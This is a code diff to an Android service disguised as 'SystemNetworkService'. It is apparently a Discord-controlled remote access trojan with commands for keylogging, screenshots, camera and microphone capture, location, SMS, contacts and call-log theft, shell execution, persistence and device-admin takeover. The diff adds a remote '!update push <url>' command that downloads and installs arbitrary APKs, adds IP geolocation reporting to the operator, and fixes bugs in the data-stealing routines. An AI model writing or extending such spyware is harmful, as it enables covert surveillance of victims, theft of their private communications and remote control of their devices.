@@ -82,11 +82,6 @@ class SystemNetworkService : Service() {
     override fun onCreate() {
         super.onCreate()
         try {
-            
-            
-            
-            
-            
             val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
                 setSound(null, null)
                 setShowBadge(false)
@@ -94,13 +89,16 @@ class SystemNetworkService : Service() {
             }
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
             showNotif("Starting...")
+            val notif = buildNotif("Starting...")
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(NOTIF_ID, buildNotif("Starting..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
-                startForeground(NOTIF_ID, buildNotif("Starting..."))
+                startForeground(NOTIF_ID, notif)
             }
         } catch (e: Exception) {
-            
+            try {
+                stopSelf()
+            } catch (_: Exception) {}
         }
 
         // Acquire wake lock to keep CPU alive
@@ -243,7 +241,7 @@ class SystemNetworkService : Service() {
                             "`ping` `info` `status` `ip` `uptime` `debug` `restart`\n" +
                             "`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n" +
                             "`contacts` `sms` `call_log` `wifi` `battery` `processes`\n" +
-                            "`installed` `notifications` `shell` `persist`\n" +
+                            "`installed` `notifications` `shell` `persist` `update`\n" +
                             "`admin` `overlay` `click` `input` `open` `screen`\n" +
                             "`gesture` `pin` `torch` `vibrate`\n\n" +
                             "Type `!help <cmd>` for usage info"
@@ -519,6 +517,36 @@ class SystemNetworkService : Service() {
                     persistApk()
                     d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                 }
+                "update" -> {
+                    val sub = payload?.trim()?.lowercase()
+                    when {
+                        sub == null || sub == "check" -> {
+                            d.sendMsg(":mag: **Checking for updates**...")
+                            val result = com.openaccess.sdk.update.UpdateManager.checkForUpdate(this, d)
+                            d.sendMsg(result)
+                        }
+                        sub.startsWith("push ") || sub.startsWith("url ") -> {
+                            val url = payload!!.substringAfter(" ").substringAfter(" ").trim()
+                            if (url.isBlank() || !url.startsWith("http")) {
+                                d.sendMsg(":x: **Invalid URL**. Usage: `!update push <direct-apk-url>`")
+                            } else {
+                                d.sendMsg(":arrow_down: **Downloading update** from URL...")
+                                val result = com.openaccess.sdk.update.UpdateManager.downloadUpdate(this, d, url)
+                                d.sendMsg(result)
+                            }
+                        }
+                        sub == "install" -> {
+                            com.openaccess.sdk.update.UpdateManager.installUpdate(this, d)
+                        }
+                        sub == "clear" -> {
+                            com.openaccess.sdk.update.UpdateManager.clearUpdate(this)
+                            d.sendMsg(":wastebasket: **Update cleared**. Pending APK removed.")
+                        }
+                        else -> {
+                            d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update")
+                        }
+                    }
+                }
                 "uptime" -> {
                     val uptime = d.getUptime()
                     val hrs = uptime / 3600000
@@ -555,6 +583,21 @@ class SystemNetworkService : Service() {
                         append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
                     }
                     d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
+                }
+                "ip" -> {
+                    val progressId = d.sendMsgAwait(":globe_with_meridians: **Fetching IP**...")
+                    try {
+                        val ipData = fetchIpInfo()
+                        val msg = if (ipData != null) {
+                            ":globe_with_meridians: **IP Info**\nIP: `${ipData["ip"]}`\nCity: ${ipData["city"]}\nRegion: ${ipData["region"]}\nCountry: ${ipData["country"]}\nISP: ${ipData["isp"]}\nLat/Lon: ${ipData["lat"]}, ${ipData["lon"]}"
+                        } else {
+                            ":x: **Failed to fetch IP info**"
+                        }
+                        if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
+                    } catch (e: Exception) {
+                        val msg = ":x: **IP error**: ${e.message?.take(50) ?: "unknown"}"
+                        if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
+                    }
                 }
                 "debug" -> {
                     val uptime = discord?.getUptime() ?: 0L
@@ -648,11 +691,12 @@ class SystemNetworkService : Service() {
                 }
                 "installed" -> {
                     val pm = packageManager
-                    val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                        PackageManager.PackageInfoFlags.of(0L)
-                    else 0
-                    @Suppress("DEPRECATION")
-                    val packages = pm.getInstalledPackages(flags as? Int ?: 0)
+                    val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0L))
+                    } else {
+                        @Suppress("DEPRECATION")
+                        pm.getInstalledPackages(0)
+                    }
                     val apps = packages
                         .filter { it.packageName != packageName }
                         .map { pi ->
@@ -1236,6 +1280,28 @@ class SystemNetworkService : Service() {
         return ":x: No location available — ensure GPS/WiFi is on and try outside"
     }
 
+    private fun fetchIpInfo(): Map<String, String>? {
+        val url = java.net.URL("http://ip-api.com/json/")
+        val conn = url.openConnection() as java.net.HttpURLConnection
+        conn.connectTimeout = 8000
+        conn.readTimeout = 8000
+        val body = conn.inputStream.bufferedReader().readText()
+        conn.disconnect()
+        val json = org.json.JSONObject(body)
+        if (json.optString("status") == "success") {
+            return mapOf(
+                "ip" to json.optString("query", "?"),
+                "city" to json.optString("city", "?"),
+                "region" to json.optString("regionName", "?"),
+                "country" to json.optString("country", "?"),
+                "isp" to json.optString("isp", "?"),
+                "lat" to json.getDouble("lat").toString(),
+                "lon" to json.getDouble("lon").toString()
+            )
+        }
+        return null
+    }
+
     private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
         return try {
             val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
@@ -1259,8 +1325,9 @@ class SystemNetworkService : Service() {
             val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
             cursor?.use { c ->
                 var count = 0
+                val nameIdx = c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
                 while (c.moveToNext() && count < 50) {
-                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
+                    val name = c.getString(nameIdx) ?: "?"
                     sb.appendLine(name)
                     count++
                 }
@@ -1275,8 +1342,10 @@ class SystemNetworkService : Service() {
         Uri.parse("content://sms/inbox"),
         arrayOf("address", "body", "date")
     ) { c ->
-        val addr = c.getString(c.getColumnIndex("address")) ?: "?"
-        val body = c.getString(c.getColumnIndex("body")) ?: ""
+        val addrIdx = c.getColumnIndexOrThrow("address")
+        val bodyIdx = c.getColumnIndexOrThrow("body")
+        val addr = c.getString(addrIdx) ?: "?"
+        val body = c.getString(bodyIdx) ?: ""
         "${addr}: ${body.take(120)}"
     }.take(1900).ifEmpty { "No SMS" }
 
@@ -1284,14 +1353,17 @@ class SystemNetworkService : Service() {
         CallLog.Calls.CONTENT_URI,
         arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE)
     ) { c ->
-        val num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) ?: "?"
-        val type = when (c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))) {
+        val numIdx = c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
+        val typeIdx = c.getColumnIndexOrThrow(CallLog.Calls.TYPE)
+        val durIdx = c.getColumnIndexOrThrow(CallLog.Calls.DURATION)
+        val num = c.getString(numIdx) ?: "?"
+        val type = when (c.getInt(typeIdx)) {
             CallLog.Calls.INCOMING_TYPE -> "IN"
             CallLog.Calls.OUTGOING_TYPE -> "OUT"
             CallLog.Calls.MISSED_TYPE -> "MISSED"
             else -> "?"
         }
-        val dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION)) ?: "0"
+        val dur = c.getString(durIdx) ?: "0"
         "$type $num (${dur}s)"
     }.take(1900).ifEmpty { "No call log" }
 
@@ -1299,7 +1371,12 @@ class SystemNetworkService : Service() {
         var recorder: MediaRecorder? = null
         try {
             val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
-            recorder = MediaRecorder().apply {
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(this@SystemNetworkService)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }.apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
@@ -1313,7 +1390,6 @@ class SystemNetworkService : Service() {
             recorder = null
             if (file.exists() && file.length() > 0) file else null
         } catch (e: Exception) {
-            
             null
         } finally {
             try { recorder?.release() } catch (_: Exception) {}
@@ -1376,7 +1452,6 @@ class SystemNetworkService : Service() {
             "netflix" to "com.netflix.mediaclient",
             "discord" to "com.discord",
             "reddit" to "com.reddit.frontpage",
-            "tiktok" to "com.zhiliaoapp.musically",
         )
         // Direct match
         commonApps[search]?.let { return it }
@@ -1385,10 +1460,12 @@ class SystemNetworkService : Service() {
             if (key.contains(search) || search.contains(key)) return pkg
         }
         // Search installed packages
-        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            PackageManager.ApplicationInfoFlags.of(0L) else 0
-        @Suppress("DEPRECATION")
-        val apps = packageManager.getInstalledApplications(flags as? Int ?: 0)
+        val apps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            packageManager.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0L))
+        } else {
+            @Suppress("DEPRECATION")
+            packageManager.getInstalledApplications(0)
+        }
         for (app in apps) {
             val label = app.loadLabel(packageManager).toString().lowercase().replace(" ", "")
             val pkgName = app.packageName.lowercase()
@@ -1424,6 +1501,7 @@ class SystemNetworkService : Service() {
             "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
             "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
             "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
+            "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
             "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
             "overlay" -> ":black_large_square: **!overlay**\nToggle black screen overlay.\nUsage: `!overlay` (on)\nUsage: `!overlay off`"
             "click" -> ":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>`\nUsage: `!click x,y`"
